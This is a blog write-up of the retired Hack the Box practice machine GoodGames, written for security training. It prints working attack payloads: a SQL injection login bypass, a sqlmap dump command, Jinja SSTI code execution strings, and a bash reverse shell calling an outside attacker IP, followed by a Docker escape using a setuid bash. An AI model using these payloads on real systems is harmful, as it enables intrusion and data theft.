---
layout: post
title: Hack the Box GoodGames
---

## A writeup of the retired easy box from Hack the Box, GoodGames.  

First things first, lets see what ports are open by running an nmap scan.

```bash
nmap -sC -sV 10.10.11.130 -oA nmap/good_games
```

[<img src="../images/good_games/nmap.png"
  style="width: 800px;"/>](../images/good_games/nmap.png)

So looks like the only port open is port 80 HTTP and it looks like its a python webserver. So I went to take a look at it.  I noticed in the footer there was reference to the hostname goodgames.htb, so I added it to my /etc/hosts file.

[<img src="../images/good_games/home.png"
  style="width: 800px;"/>](../images/good_games/home.png)
  
I poked around on the website and there was nothing much of interest.  At this point I fired up burpsuite and enabled the proxy in firefox to take a look at the site.  From this I saw there was reference to /login and /signup.

[<img src="../images/good_games/burp.png"
  style="width: 800px;"/>](../images/good_games/burp.png)
  
At the same time I had been running gobuster which ended up discovering the same pages `gobuster dir -u http://goodgames.htb -w /usr/share/seclists/discovery/web-content/raft-small-words.txt -o gobuster.out`.

[<img src="../images/good_games/gobuster.png"
  style="width: 800px;"/>](../images/good_games/gobuster.png)
  
I ended up on the /signup page and attempted to login with `admin@goodgames.htb:admin` and was taken to a page with the message `500 Internal Server Error`. 

[<img src="../images/good_games/500.png"
  style="width: 800px;"/>](../images/good_games/500.png)
  
Sending the same request through burpsuite I tried to check for some basic SQL injection on the email address:

```bash
email=admin'or 1 = 1 -- -&password=adwadw
```
Success.

[<img src="../images/good_games/sql_injection.png"
  style="width: 800px;"/>](../images/good_games/sql_injection.png)
  
With confirmed sql injection I saved the request from burp and passed it to sqlmap and dumped the users table.

```bash
sqlmap -r test.req --batch --dump --threads 10
```
  
[<img src="../images/good_games/sqlmap.png"
  style="width: 800px;"/>](../images/good_games/sqlmap.png)

[<img src="../images/good_games/dump.png"
  style="width: 800px;"/>](../images/good_games/dump.png)
  
So I had some credentials for the admin account but the password appears to be hashed.  I could have tried to crack the hash using hashcat but I always like to check [crackstation](https://crackstation.net/).

[<img src="../images/good_games/crackstation.png"
  style="width: 800px;"/>](../images/good_games/crackstation.png)
  
With the credentials `admin@goodgames.htb:superadministrator` I logged in.  

[<img src="../images/good_games/logged_in_admin.png"
  style="width: 800px;"/>](../images/good_games/logged_in_admin.png)
  
After clicking around I didn't find anything of value until I noticed the cog in the top right corner of the page. 
Clicking the link took me to a page which failed to load, but allowed me to see another hostname to add to my /etc/hosts file `internal-administration.goodgames.htb`.

I am taken to a login page and wonder if the administrator has re-used the same password.  

[<img src="../images/good_games/internal_login.png"
  style="width: 800px;"/>](../images/good_games/internal_login.png)
  
[<img src="../images/good_games/internal_dashboard.png"
  style="width: 800px;"/>](../images/good_games/internal_dashboard.png)
  
Yup I was logged in.  A great example of why you should not re-use passwords. I poked around at the application and found the user settings page.  As the server was running python I checked for SSTI vulnerabilties, as I guessed it could be using a templating engine such as jinja.

[<img src="../images/good_games/ssti.png"
  style="width: 800px;"/>](../images/good_games/ssti.png)
  
[<img src="../images/good_games/ssti_success.png"
  style="width: 800px;"/>](../images/good_games/ssti_success.png)

As you can see after entering the payload 

```bash
{{ 7*7 }}
``` 
For the full name, upon saving this the templating engine has interpreted this as 49.  So we have a SSTI vulnerability we can exploit.  After heading over to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) which is a great resource.  Within the SSTI section I found some payloads which could potentially give us RCE or remote code execution. 

I used the payload 

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
``` 
and entered a date of birth and phone number and hit save. 

[<img src="../images/good_games/ssti_id.png"
  style="width: 800px;"/>](../images/good_games/ssti_id.png)

As you can see from the username on the right of the page it is showing we have code execution and we actually have it as the root user. 

So now it was time to leverage this code execution to get a reverse shell on the server.  With the payload 

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.36/9001 0>&1"').read() }}
```

[<img src="../images/good_games/rev_shell.png"
  style="width: 800px;"/>](../images/good_games/rev_shell.png)
  
[<img src="../images/good_games/rev_shell_success.png"
  style="width: 800px;"/>](../images/good_games/rev_shell_success.png)
  
I now had a reverse shell which what appeared to be the root user.  I upgraded and stabilised my shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and then ctrl+z `stty raw -echo; fg` enter enter.  Then so I could clear my terminal `export TERM=xterm`. 

I found the `/home/augustus` directory and the user.txt file with the user flag.  But after poking around it became apparent I was not on the host machine.  It appeared I was inside a docker instance.  But the Augustus user was not mentioned in the `/etc/passwd` file which means it must be a user on the host machine. 

I then downloaded and used a tool [deepce](https://github.com/stealthcopter/deepce).  I downloaded the latest version, created a python webserver on my attack machine `python3 -m http-server 8000` and transferred it to the victim machine.  

[<img src="../images/good_games/deepce.png"
  style="width: 800px;"/>](../images/good_games/deepce.png)
  
[<img src="../images/good_games/deepce_results.png"
  style="width: 800px;"/>](../images/good_games/deepce_results.png)
  
From the results I could see a potential IP for the host machine of `172.19.0.1`.  I could have tried to enumerate what ports were open on this IP but I thought I would try my luck with SSH and wondered if the admin had reused the same password again. Surely not...

[<img src="../images/good_games/ssh_success.png"
  style="width: 800px;"/>](../images/good_games/ssh_success.png)

Wow.  I have learnt while doing other machines that reuse of password is such a common vulnerability and is always worth a shot. 

At this point I got a little stuck with the privilege escalation part of the machine.  I ran LinPeas on the host machine and didn't get anything interesting.  

I poked around at all the usual config files and found some secret_keys for the DB and confirmed the hashed password I had found earlier was there.  

After a while I realised that as I was root on the docker container, if I could run a binary with root privileges as Augustus and retained the privileges it would get me root on the host machine. 

So I thought the easiest way to do this would be to copy the legitimate `/bin/bash` file on the host machine to `/home/augustus` directory.  I then switched back to the root user within the docker container and set ownership of `bin/bash` as root. And made the file a setuid executable.

`chown root:root bash`
`chmod +s bash`

[<img src="../images/good_games/root_own_bash.png"
  style="width: 800px;"/>](../images/good_games/root_own_bash.png)
  
[<img src="../images/good_games/setuid_bash.png"
  style="width: 800px;"/>](../images/good_games/setuid_bash.png)
  
I then logged back into SSH with augustus and ran `./bash -p` to retain privileges.

[<img src="../images/good_games/priv_esc.png"
  style="width: 800px;"/>](../images/good_games/priv_esc.png)
  
From there I was able to access `/root/root.txt` for the system flag.  And that was the box.  I found the first part of the box really fun and easy to find common web vulnerabilities.  The privilege escalation path was not something I have had to do before (escape from a docker container) but was really interesting and I have certainly learnt a few new tricks and technniques. 

Thank you to the creator TheCyberGeek for the machine.
